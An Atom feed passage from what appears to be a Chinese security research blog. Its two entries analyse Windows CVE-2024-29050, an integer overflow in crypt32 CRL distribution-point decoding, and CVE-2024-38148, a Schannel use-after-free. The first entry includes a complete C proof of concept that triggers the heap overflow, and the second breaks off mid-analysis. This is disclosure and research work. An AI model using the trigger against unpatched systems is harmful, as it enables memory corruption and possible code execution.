<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>VictorV的小博客</title>
  
  
  <link href="http://474172261.github.io/atom.xml" rel="self"/>
  
  <link href="http://474172261.github.io/"/>
  <updated>2024-08-23T05:36:51.360Z</updated>
  <id>http://474172261.github.io/</id>
  
  <author>
    <name>VictorV</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows Cryptographic Services RCE CVE-2024-29050的介绍</title>
    <link href="http://474172261.github.io/2024/08/23/CVE-2024-29050/"/>
    <id>http://474172261.github.io/2024/08/23/CVE-2024-29050/</id>
    <published>2024-08-23T03:16:55.420Z</published>
    <updated>2024-08-23T05:36:51.360Z</updated>
    
    <content type="html"><![CDATA[<p>在挖掘secure schannel的过程中, 发现后期有在调用<code>crypt32!CryptDecodeObject</code>函数去解码证书相关操作, 于是深入分析了一下, 发现存在很明显的整数溢出问题, 后来发现有长度限制. 经过遍历所有的解码操作, 找到了可以成功触发的整数溢出. 一起来了解一下吧.</p><span id="more"></span><p>先来了解一下<code>CryptDecodeObject</code>函数接口.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CryptDecodeObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]      DWORD      dwCertEncodingType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]      LPCSTR     lpszStructType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]      <span class="type">const</span> BYTE *pbEncoded,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]      DWORD      cbEncoded,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]      DWORD      dwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]     <span class="type">void</span>       *pvStructInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out] DWORD      *pcbStructInfo</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>[in] dwCertEncodingType</code></p><p>编码类型, 有两种, 可以或在一起.</p><ul><li>X509_ASN_ENCODING</li><li>PKCS_7_ASN_ENCODING</li></ul><p><code>[in] lpszStructType</code></p><p>OID, 可以是数字, 也可以是字符串. 参考 <a href="https://learn.microsoft.com/en-us/windows/desktop/SecCrypto/constants-for-cryptencodeobject-and-cryptdecodeobject">Constants for CryptEncodeObject and CryptDecodeObject</a>.</p><p>调用关系路径示例:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">crypt32!CryptDecodeObject(X509_ASN_ENCODING(<span class="number">1</span>), X509_ECC_SIGNATURE(<span class="number">47</span>), ...)</span><br><span class="line">    CryptDecodeObjectEx</span><br><span class="line">    Asn1X509DHParametersDecodeEx</span><br><span class="line">    Asn1InfoDecodeAndAllocEx</span><br><span class="line">    msasn1!ASN1_Decode <span class="comment">// 检查len, 不能超过 0x61a8000 (100M)</span></span><br><span class="line">    crypto32!ASN1Dec_DHParameters <span class="comment">// label1</span></span><br><span class="line">    ....</span><br></pre></td></tr></table></figure><p>不同的oid, <code>label1</code>位置就会是不同的调用函数, 具体函数列表见文章末尾.</p><p>有问题的函数存在于<code>ASN1Dec_CRLDistributionPoints</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">ASN1Dec_CRLDistributionPoints</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> <span class="type">int</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)ASN1BERDecExplicitTag(a1, a2, &amp;v23, &amp;v25) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  *a3 = <span class="number">0</span>;</span><br><span class="line">  *((_QWORD *)a3 + <span class="number">1</span>) = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)ASN1BERDecNotEndOfContents(v23, v25) )</span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(v3) = (<span class="type">unsigned</span> <span class="type">int</span>)ASN1BERDecEndOfContents(a1, v23, v25) != <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)ASN1BERDecPeekTag(v23, &amp;v21) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( *a3 &gt;= v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 )</span><br><span class="line">        v6 *= <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v6 = <span class="number">16</span>;</span><br><span class="line">      v7 = ASN1DecRealloc(v23, *((_QWORD *)a3 + <span class="number">1</span>), v6 &lt;&lt; <span class="number">6</span>);<span class="comment">// label2</span></span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">      *((_QWORD *)a3 + <span class="number">1</span>) = v7;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">    v11 = *((_QWORD *)a3 + <span class="number">1</span>) + (v10 &lt;&lt; <span class="number">6</span>);</span><br><span class="line">    *a3 = *a3 + <span class="number">1</span>;</span><br><span class="line">......</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>label2</code>位置, 如果v6大于<code> 0x20,0000</code>, <code>2*v6*0x40 =&gt; 0x1,0000,0000</code>, 而<code>ASN1DecRealloc</code>函数的第三个参数是一个int类型, 导致整数截断, 从而申请非常小的内存, 导致后面溢出. 因为可以控制内容, 所以溢出多少是大致可控的, 所以还是有不小的可利用性. 唯一的问题就是, 这个OID是0x23, 要找到windows支持它的服务是比较困难的, 通过逐一搜索所有导入了<code>CryptDecodeObject</code>函数的dll和exe文件, 最终找到一个使用到它的工具, 就是<code>certutil.exe</code>.</p><p>触发栈回溯为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">00 0000004a`b0c7e680 00007ffd`e8fa5b1b     ucrtbase!memset_repstos+0x9</span><br><span class="line">01 0000004a`b0c7e690 00007ffd`e8fa5942     CRYPT32!Asn1X509CrlDistPointsDecodeExCallback+0x77</span><br><span class="line">02 0000004a`b0c7e700 00007ffd`e8f568f5     CRYPT32!Asn1X509CrlDistPointsDecodeEx+0xb2</span><br><span class="line">03 0000004a`b0c7e780 00007ffd`e8f564de     CRYPT32!CryptDecodeObjectEx+0x145</span><br><span class="line">04 0000004a`b0c7e830 00007ffd`e2b2185a     CRYPT32!CryptDecodeObject+0x2e</span><br><span class="line">05 0000004a`b0c7e880 00007ffd`e2b2096a     cryptnet!ObjectContextGetRawUrlData+0x21a</span><br><span class="line">06 0000004a`b0c7e9c0 00007ffd`e2b11e2a     cryptnet!CertificateCrlDistPointGetObjectUrl+0x7a</span><br><span class="line">07 0000004a`b0c7eaf0 00007ffd`e2b119fc     cryptnet!CTVOAgent::GetTimeValidObject+0x41a</span><br><span class="line">08 0000004a`b0c7ed30 00007ffd`e2b27cff     cryptnet!CrlFromCertGetTimeValidObject+0x5c</span><br><span class="line">09 0000004a`b0c7eda0 00007ffd`e2b274fb     cryptnet!CryptGetTimeValidObject+0xbf</span><br><span class="line">0a 0000004a`b0c7ee20 00007ffd`e2b26213     cryptnet!GetTimeValidCrl+0x38b</span><br><span class="line">0b 0000004a`b0c7ef50 00007ffd`e8f475be     cryptnet!MicrosoftCertDllVerifyRevocation+0x213</span><br><span class="line">0c 0000004a`b0c7f0b0 00007ffd`e8f46785     CRYPT32!VerifyDefaultRevocation+0x552</span><br><span class="line">0d 0000004a`b0c7f1d0 00007ff7`8d71812f     CRYPT32!CertVerifyRevocation+0x115</span><br><span class="line">0e 0000004a`b0c7f2d0 00007ff7`8d717dba     certutil!VerifyRevocation+0xd3</span><br><span class="line">0f 0000004a`b0c7f380 00007ff7`8d7164f7     certutil!VerifyCertAgainstParent+0x82e</span><br><span class="line">10 0000004a`b0c7f490 00007ff7`8d71bc70     certutil!VerifyCRLAgainstCACert+0x647</span><br><span class="line">11 0000004a`b0c7f5a0 00007ff7`8d6b3849     certutil!verbVerifyCert+0x1c0</span><br><span class="line">12 0000004a`b0c7f640 00007ff7`8d78630c     certutil!ArgvMain+0x9ed</span><br><span class="line">13 0000004a`b0c7f870 00007ff7`8d785ecc     certutil!myPreMain+0x41c</span><br><span class="line">14 0000004a`b0c7f9c0 00007ffd`eadea1f8     certutil!myMainWndProc+0x3c</span><br><span class="line">15 0000004a`b0c7f9f0 00007ffd`eaded038     USER32!UserCallWinProcCheckWow+0x398</span><br><span class="line">16 0000004a`b0c7fb40 00007ff7`8d786575     USER32!DispatchMessageWorker+0x378</span><br><span class="line">17 0000004a`b0c7fbc0 00007ff7`8d6a3d96     certutil!wWinMain+0x1ad</span><br><span class="line">18 0000004a`b0c7fcb0 00007ffd`e9711f87     certutil!__wmainCRTStartup+0x1d6</span><br><span class="line">19 0000004a`b0c7fd70 00007ffd`eb97b5b0     KERNEL32!BaseThreadInitThunk+0x17</span><br><span class="line">1a 0000004a`b0c7fda0 00000000`00000000     ntdll!RtlUserThreadStart+0x20</span><br></pre></td></tr></table></figure><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>在12月的时候, <a href="https://twitter.com/hexnomad?lang=en">Eric</a> 也挖到了这个漏洞, 并且他还发现了一种远程利用的触发路径, <a href="https://x.com/hexnomad/status/1777788190130147427">演示视频</a>, 另外他还发现了另一个整数溢出, 具体见他的演讲pdf <a href="https://cfp.recon.cx/media/recon2024/submissions/SB3QLK/resources/Tales_From_The_Crypt_-_Egsgard_-_RECon_2024_COxZmIb.pdf">Talse from The Crypt</a>, 很不错的一个演讲.</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wincrypt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Crypt32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Bcrypt.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> u8;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE (0x4000000+0x30)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* buf = (<span class="type">char</span>*)<span class="built_in">calloc</span>(<span class="number">1</span>, MAX_SIZE);</span><br><span class="line"></span><br><span class="line">    HCERTSTORE hStore = <span class="literal">NULL</span>;</span><br><span class="line">    PCCERT_CONTEXT pCert = <span class="literal">NULL</span>;</span><br><span class="line">    BCRYPT_KEY_HANDLE hKey = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    DWORD pcbStructInfo[<span class="number">4</span>];</span><br><span class="line">    pcbStructInfo[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// explicit tag</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    buf[i++] = <span class="number">0x20</span>|<span class="number">0x10</span>;</span><br><span class="line">    buf[i++] = <span class="number">0x84</span>;</span><br><span class="line">    *(u32*)(buf + i) = ntohl(MAX_SIZE - <span class="number">0x30</span> + <span class="number">2</span>);</span><br><span class="line">    i += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; (MAX_SIZE<span class="number">-0x30</span>+<span class="number">2</span>) /<span class="number">2</span>; j++) &#123;</span><br><span class="line">        <span class="comment">// ASN1BERDecEoid</span></span><br><span class="line">        buf[i++] = <span class="number">0x20</span>|<span class="number">0x10</span>;</span><br><span class="line">        buf[i++] = <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="comment">// &quot;1.1.&quot; 4bytes, </span></span><br><span class="line"></span><br><span class="line">    CryptDecodeObject(<span class="number">1</span>, (LPCSTR)<span class="number">0x23</span>, (<span class="type">const</span> BYTE*)buf, MAX_SIZE<span class="number">-0x10</span>, <span class="number">0</span>, <span class="number">0</span>, pcbStructInfo);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ASN1Dec列表"><a href="#ASN1Dec列表" class="headerlink" title="ASN1Dec列表"></a>ASN1Dec列表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">0 ASN1Dec_EncodedObjectID  1800a02b0</span><br><span class="line">1 ASN1Dec_Bits  180095e20</span><br><span class="line">2 ASN1Dec_IntegerType  1800a27c0</span><br><span class="line">3 ASN1Dec_HugeIntegerType  1800a3d00</span><br><span class="line">4 ASN1Dec_OctetStringType_0  1800a36e0</span><br><span class="line">5 ASN1Dec_EnumeratedType  1800ba230</span><br><span class="line">6 ASN1Dec_UtcTime  1800a4aa0</span><br><span class="line">7 ASN1Dec_AnyString  180077ce0</span><br><span class="line">8 ASN1Dec_AlgorithmIdentifier  180076ff0</span><br><span class="line">9 ASN1Dec_Name  180077f20</span><br><span class="line">10 ASN1Dec_Attributes  180077a40</span><br><span class="line">11 ASN1Dec_RSAPublicKey  1800877f0</span><br><span class="line">12 ASN1Dec_RSAPublicKey2  18008e170</span><br><span class="line">13 ASN1Dec_DSSParameters  1800b2ba0</span><br><span class="line">14 ASN1Dec_RSAPublicKey_0  1800e8ea0</span><br><span class="line">15 ASN1Dec_DHParameters  1800a01d0</span><br><span class="line">16 ASN1Dec_RC2CBCParameters  1800eb260</span><br><span class="line">17 ASN1Dec_SMIMECapabilities  1800eb8d0</span><br><span class="line">18 ASN1Dec_SubjectPublicKeyInfo  180084210</span><br><span class="line">19 ASN1Dec_ChoiceOfTime  1800770d0</span><br><span class="line">20 ASN1Dec_Extensions  1800775d0</span><br><span class="line">21 ASN1Dec_SignedContent  1800871d0</span><br><span class="line">22 ASN1Dec_CertificationRequestInfo  1800e7f60</span><br><span class="line">23 ASN1Dec_CertificationRequestInfoDecode  1800b3af0</span><br><span class="line">24 ASN1Dec_KeygenRequestInfo  1800e9610</span><br><span class="line">25 ASN1Dec_AuthorityKeyId  1800a84e0</span><br><span class="line">26 ASN1Dec_AltNames  1800790c0</span><br><span class="line">27 ASN1Dec_EDIPartyName  1800e9030</span><br><span class="line">28 ASN1Dec_BasicConstraints2  18008ac60</span><br><span class="line">29 ASN1Dec_CertificatePolicies  180081880</span><br><span class="line">30 ASN1Dec_CertificatePolicies95  1800e7e40</span><br><span class="line">31 ASN1Dec_AuthorityKeyId2  180078c40</span><br><span class="line">32 ASN1Dec_AuthorityInfoAccess  1800788e0</span><br><span class="line">33 ASN1Dec_CRLDistributionPoints  180078d90</span><br><span class="line">34 ASN1Dec_ContentInfo_0  18009fe00</span><br><span class="line">35 ASN1Dec_SeqOfAny  180079740</span><br><span class="line">36 ASN1Dec_TimeStampRequest  1800ec370</span><br><span class="line">37 ASN1Dec_ContentInfoOTS  1800e8730</span><br><span class="line">38 ASN1Dec_TimeStampRequestOTS  1800ec450</span><br><span class="line">39 ASN1Dec_EnhancedKeyUsage  180083970</span><br><span class="line">40 ASN1Dec_EnrollmentNameValuePair  1800e9310</span><br><span class="line">41 ASN1Dec_CSPProvider  1800e7a20</span><br><span class="line">42 ASN1Dec_CertificatePair  1800aadd0</span><br><span class="line">43 ASN1Dec_IssuingDistributionPoint  1800784d0</span><br><span class="line">44 ASN1Dec_PolicyMappings  1800aca70</span><br><span class="line">45 ASN1Dec_PolicyConstraints  1800b3e30</span><br><span class="line">46 ASN1Dec_CmcAddExtensions  1800e81f0</span><br><span class="line">47 ASN1Dec_CmcAddAttributes  1800e8130</span><br><span class="line">48 ASN1Dec_CertificateTemplate  1800a3390</span><br><span class="line">49 ASN1Dec_OcspBasicResponse  180076130</span><br><span class="line">50 ASN1Dec_BiometricSyntax  1800e77e0</span><br><span class="line">51 ASN1Dec_Attribute  1800853a0</span><br><span class="line">52 ASN1Dec_X942DhParameters  1800ecb30</span><br><span class="line">53 ASN1Dec_X942DhOtherInfo  1800ec9b0</span><br><span class="line">54 ASN1Dec_CertificateToBeSigned  18007d6a0</span><br><span class="line">55 ASN1Dec_CertificateRevocationListToBeSigned  180075f30</span><br><span class="line">56 ASN1Dec_KeyAttributes  1800e93d0</span><br><span class="line">57 ASN1Dec_KeyUsageRestriction  1800e9510</span><br><span class="line">58 ASN1Dec_BasicConstraints  1800b4230</span><br><span class="line">59 ASN1Dec_UserNotice  1800ec6b0</span><br><span class="line">60 ASN1Dec_VerisignQualifier1  1800ec7b0</span><br><span class="line">61 ASN1Dec_ContentInfoSeqOfAny  1800e8850</span><br><span class="line">62 ASN1Dec_CertificateTrustList  180076c10</span><br><span class="line">63 ASN1Dec_NameConstraints  1800783e0</span><br><span class="line">64 ASN1Dec_CrossCertDistPoints  1800e8dd0</span><br><span class="line">65 ASN1Dec_CmcData  1800e82b0</span><br><span class="line">66 ASN1Dec_CmcResponseBody  1800e8380</span><br><span class="line">67 ASN1Dec_CmcStatusInfo  1800e8430</span><br><span class="line">68 ASN1Dec_OcspTbsRequest  1800a8b90</span><br><span class="line">69 ASN1Dec_OcspResponse  180095c50</span><br><span class="line">70 ASN1Dec_OcspBasicResponseData  180076280</span><br><span class="line">71 ASN1Dec_RsaSsaPssParameters  1800eb630</span><br><span class="line">72 ASN1Dec_RsaesOaepParameters  1800b0010</span><br><span class="line">73 ASN1Dec_OcspRequest  1800aeba0</span><br><span class="line">74 ASN1Dec_LogotypeExtn  1800e9b90</span><br><span class="line">75 ASN1Dec_EccCmsSharedInfo  1800e9190</span><br><span class="line">76 ASN1Dec_TimeStampReq  1800ec1c0</span><br><span class="line">77 ASN1Dec_TSTInfo  1800768e0</span><br><span class="line">78 ASN1Dec_TimeStampResp  1800ec530</span><br><span class="line">79 ASN1Dec_ChoiceOfCertOrCrl  1800e8040</span><br><span class="line">80 ASN1Dec_CertificateBundle  1800e7d40</span><br><span class="line">81 ASN1Dec_RSAPrivateKey_0  1800eb330</span><br><span class="line">82 ASN1Dec_SubjectDirectoryAttributes  1800ebac0</span><br><span class="line">83 ASN1Dec_SupportedAlgorithm  1800ebd00</span><br><span class="line">84 ASN1Dec_TPMSpecification  1800ebe10</span><br><span class="line">85 ASN1Dec_CRLEntry  180077460</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;在挖掘secure schannel的过程中, 发现后期有在调用&lt;code&gt;crypt32!CryptDecodeObject&lt;/code&gt;函数去解码证书相关操作, 于是深入分析了一下, 发现存在很明显的整数溢出问题, 后来发现有长度限制. 经过遍历所有的解码操作, 找到了可以成功触发的整数溢出. 一起来了解一下吧.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Windows Secure Channel RCE CVE-2024-38148的介绍</title>
    <link href="http://474172261.github.io/2024/08/19/CVE-2024-38148/"/>
    <id>http://474172261.github.io/2024/08/19/CVE-2024-38148/</id>
    <published>2024-08-19T02:17:59.205Z</published>
    <updated>2024-08-23T03:16:40.116Z</updated>
    
    <content type="html"><![CDATA[<p>我之前看过一次secure channel, 在跟踪crypto处理时, 也发现了一个整数溢出(CVE-2024-29050), 可惜的是没找到远程无认证的攻击场景, 最后只能实现基于文件的远程代码执行. 在这个公告更新的时候, 也去分析了一下问题, 发现它并不是如微软官方定义的那样, 是一个dos的问题, 实际上, 它是一个uaf问题, 而且有利用的潜质, 合理的利用是非常可能被用于未认证的远程代码执行的, 鉴于它的危害性, 我就没有在补丁出来后公告, 而是现在才发文. 下面让我们一起了解一下吧.</p><span id="more"></span><h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h1><p>首先, 通过补丁对比, 很容易就看到修补的位置, 在 <code>CSsl3TlsContext::CSsl3TlsContext</code>函数内, 多了这么一段代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)wil::details::FeatureImpl&lt;__WilFeatureTraits_Feature_2612696381&gt;::__private_IsEnabled(&amp;`wil::Feature&lt;__WilFeatureTraits_Feature_2612696381&gt;::GetImpl<span class="number">&#x27;</span>::`<span class="number">2&#x27;</span>::impl) )</span><br><span class="line">&#123;</span><br><span class="line">  *(_QWORD *)(<span class="keyword">this</span> + <span class="number">472</span>) = *(_QWORD *)(a2 + <span class="number">472</span>);</span><br><span class="line">  *(_QWORD *)(a2 + <span class="number">472</span>) = <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过实际测试, 这个feature函数返回1, 因此补丁实际上是屏蔽了这个字段的赋值操作. </p><p>让我们来分析一下 472偏移的位置放了什么东西.</p><p>使用ida搜索binary:</p><p><img src="/images/CVE-2024-38148.assets/1724034570953.png" alt="1724034570953"></p><p>筛选一下结果, 得到如下赋值操作:</p><p><img src="/images/CVE-2024-38148.assets/1724034623677.png" alt="1724034623677"></p><p>在函数<code>CSsl3TlsServerContext::ProcessRecord</code>内, 一段代码如下:</p><p><img src="/images/CVE-2024-38148.assets/1724034677110.png" alt="1724034677110"></p><p>可以看到, 这里申请了一个新内存(记作M1), 并将它赋值给472(hex: 1D8h)的字段.</p><p>查看函数<code>CTlsMessageFragment::Initialize</code>:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">CTlsMessageFragment::Initialize</span><span class="params">(CTlsMessageFragment *<span class="keyword">this</span>, <span class="keyword">struct</span> CSsl3TlsContext *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)<span class="keyword">this</span> = a2;</span><br><span class="line">  ......</span><br><span class="line">  v3 = <span class="number">1536</span>;</span><br><span class="line">LABEL_9:</span><br><span class="line">  *((_DWORD *)<span class="keyword">this</span> + <span class="number">3</span>) = v3;</span><br><span class="line">  v5 = *((_DWORD *)<span class="keyword">this</span> + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0xFFFFFF</span> )</span><br><span class="line">    v5 = <span class="number">0xFFFFFF</span>;</span><br><span class="line">  *((_DWORD *)<span class="keyword">this</span> + <span class="number">2</span>) = v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到, 它把a2赋值给了M1的第一个8字节的字段.</p><p>那么我们大概可以得出一个结论, 那就是在<code>CSsl3TlsContext::CSsl3TlsContext</code>内, 虽然赋值操作将a2结构体的472字段置零了, 但是, 没有更新M1的第一个字段, 导致它还是指向了a2, 所以, 可能在后续的释放流程里, 原始的a2结构体被先释放了, 然后接着在新的结构体里引用了M1的第一个字段, 从而导致了UAF问题.</p><p>接下来我们看一下其它引用了该字段且是free或者clean的操作:</p><p><img src="/images/CVE-2024-38148.assets/1724035328253.png" 